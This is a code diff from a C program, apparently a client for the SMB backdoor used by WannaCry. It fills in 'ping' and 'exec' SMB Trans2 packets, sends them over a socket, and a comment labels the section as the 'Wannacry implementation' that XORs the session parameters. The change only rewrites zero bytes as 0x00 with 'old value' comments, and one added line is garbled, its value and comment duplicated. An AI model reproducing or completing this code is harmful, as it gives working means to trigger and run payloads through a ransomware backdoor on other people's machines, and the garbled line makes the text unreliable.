@@ -360,27 +360,27 @@ int main(int argc, char* argv[])
 	pingpacket.subcommand = SWAP_SHORT(0x0e00);         //original 0x0e00 ( little endian format )
 	pingpacket.ByteCount = SWAP_SHORT(0x0D00);          //value should be 13
 	pingpacket.padding = SWAP_SHORT(0x00);			//should be 0x00
-	pingpacket.signature[0] = '\0';
-	pingpacket.signature[1] = '\0';
-	pingpacket.signature[2] = '\0';
-	pingpacket.signature[3] = '\0';
-	pingpacket.signature[4] = '\0';
-	pingpacket.signature[5] = '\0';
-	pingpacket.signature[6] = '\0';
-	pingpacket.signature[7] = '\0';
+	pingpacket.signature[0] = 0x00; //old value: '\0';
+	pingpacket.signature[1] = 0x00; //old value: '\0';
+	pingpacket.signature[2] = 0x00; //old value: '\0';
+	pingpacket.signature[3] = 0x00; //old value: '\0';
+	pingpacket.signature[4] = 0x00; //old value: '\0';
+	pingpacket.signature[5] = 0x00; //old value: '\0';
+	pingpacket.signature[6] = 0x00; //old value: '\0';
+	pingpacket.signature[7] = 0x00; //old value: '\0';
 
-	pingpacket.SESSION_SETUP_PARAMETERS[0] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[1] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[2] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[3] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[4] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[5] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[6] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[7] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[8] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[9] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[10] = '\0';
-	pingpacket.SESSION_SETUP_PARAMETERS[11] = '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[0] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[1] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[2] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[3] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[4] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[5] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[6] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[7] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[8] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[9] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[10] = 0x00; //old value: '\0';
+	pingpacket.SESSION_SETUP_PARAMETERS[11] = 0x00; //old value: '\0';
 
 	send(sock, (char*)&pingpacket, sizeof(pingpacket), 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
@@ -623,14 +623,14 @@ int main(int argc, char* argv[])
 	execpacket.subcommand = 0x000e;         //original 0x0e00 ( little endian format )
 	execpacket.ByteCount = 0xD;          //value should be 13
 	execpacket.padding = SWAP_SHORT(0x00);			//should be 0x00
-	execpacket.signature[0] = '\0';
-	execpacket.signature[1] = '\0';
-	execpacket.signature[2] = '\0';
-	execpacket.signature[3] = '\0';
-	execpacket.signature[4] = '\0';
-	execpacket.signature[5] = '\0';
-	execpacket.signature[6] = '\0';
-	execpacket.signature[7] = '\0';
+	execpacket.signature[0] = 0x00; //old value: '\0';
+	execpacket.signature[1] = 0x00; //old value: '\0';0x00; //old value: '\0';
+	execpacket.signature[2] = 0x00; //old value: '\0';
+	execpacket.signature[3] = 0x00; //old value: '\0';
+	execpacket.signature[4] = 0x00; //old value: '\0';
+	execpacket.signature[5] = 0x00; //old value: '\0';
+	execpacket.signature[6] = 0x00; //old value: '\0';
+	execpacket.signature[7] = 0x00; //old value: '\0';
 
 	//Wannacry implementation - generate the SESSION_SETUP parameters
 	//copy values to parameters buffer then XOR it
